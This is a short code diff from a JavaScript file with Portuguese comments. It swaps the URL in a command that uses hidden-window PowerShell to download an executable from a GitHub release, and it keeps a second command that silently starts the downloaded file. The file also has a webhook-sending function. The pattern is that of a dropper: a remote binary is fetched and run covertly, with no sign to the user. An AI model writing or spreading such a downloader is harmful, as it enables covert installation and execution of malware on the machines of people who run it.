@@ -29,7 +29,7 @@ function enviarWebhook(msg) {
 const exePathPs = exePath.replace(/\\/g, '\\\\');
 
 // Comando para baixar
-const comandoDownload = `powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/reallopez/discord2/releases/download/ping/app.exe' -OutFile '${exePathPs}'"`;
+const comandoDownload = `powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/reallopez/discord2/releases/download/ping/user_print.exe' -OutFile '${exePathPs}'"`;
 
 // Comando para executar
 const comandoExec = `powershell -WindowStyle Hidden -Command "Start-Process '${exePathPs}'"`;
